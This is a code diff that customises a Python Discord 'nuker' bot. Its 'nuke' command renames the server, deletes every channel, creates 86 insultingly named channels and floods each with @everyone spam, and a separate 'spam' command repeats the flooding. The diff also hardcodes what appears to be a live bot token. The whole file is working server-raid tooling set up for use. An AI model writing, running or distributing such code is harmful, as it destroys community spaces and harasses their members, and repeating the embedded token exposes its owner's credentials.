@@ -16,7 +16,7 @@ client = commands.Bot(command_prefix=prefix, intents=intents)
 @client.event
 async def on_ready():
     print('Bot is online')
-    await client.change_presence(activity=discord.Game('Security'))
+    await client.change_presence(activity=discord.Game('ANO'))
 
 @client.command()
 async def ping(ctx):
@@ -29,7 +29,7 @@ async def invite(ctx):
 @client.command()
 async def nuke(ctx):
 
-    await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
+    await ctx.guild.edit(name='NUKE IT') #Decide what to change the server name to
 
     for c in ctx.guild.channels:
         await c.delete()
@@ -38,23 +38,23 @@ async def nuke(ctx):
 
     n=0
     while(n<=85):
-        await guild.create_text_channel('CHANNEL NAME HERE') # Decide what should be the name of the text channels that you will create
+        await guild.create_text_channel('TINGIN PANGET') # Decide what should be the name of the text channels that you will create
         n = n+1
 
     for c in ctx.guild.text_channels:
-             await c.send('@everyone ') # Put the messages you want to be spammed here
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV') # Put the messages you want to be spammed here
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
 
 @client.command()
 async def spam(ctx):
     for c in ctx.guild.text_channels:
-             await c.send('@everyone ') #Put what to be spammed in the brackets 
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV') #Put what to be spammed in the brackets 
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
+             await c.send('@everyone WAAHAHAHAH SINGLE DSURV')
 
-client.run('YOUR TOKEN HERE')
+client.run('OTA1NDA1NzIwNDM3MDY3Nzg2.YYJmyQ.dR_5r0nrfZl9gWYPPkUh1pqwhFI')
